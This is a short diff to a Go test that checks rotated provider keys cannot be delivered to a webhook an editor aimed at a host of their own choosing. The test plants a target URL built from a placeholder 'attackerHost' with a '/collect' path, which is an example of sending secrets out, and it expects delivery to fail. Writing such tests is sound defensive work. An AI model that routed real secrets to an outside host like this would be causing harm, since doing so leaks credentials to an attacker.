@@ -353,7 +353,9 @@ func TestEditorCannotRepointAProviderKeyAtAHostTheyChose(t *testing.T) {
 	t.Run("delivery refuses a target that is already stored", func(t *testing.T) {
 		// The write above is refused, so plant one the way an older binary would
 		// have and prove DELIVERY refuses it too.
-		results := DeliverRotatedKey(ctx, env.queries, env.vault, entryID, "team-openai", "old", "new-secret-value",
+		results := DeliverRotatedKey(ctx, env.queries, env.vault, entryID, "team-openai",
+			env.vault.MintedEntrySecret([]byte("old"), entryID, "team-openai"),
+			env.vault.MintedEntrySecret([]byte("new-secret-value"), entryID, "team-openai"),
 			[]RotationTarget{{Type: "webhook", WebhookURL: "https://" + attackerHost + "/collect", ConfiguredBy: operator}}, operator)
 		if len(results) != 1 || results[0].Success {
 			t.Fatalf("delivery to a pinned entry's webhook must fail, got %+v", results)
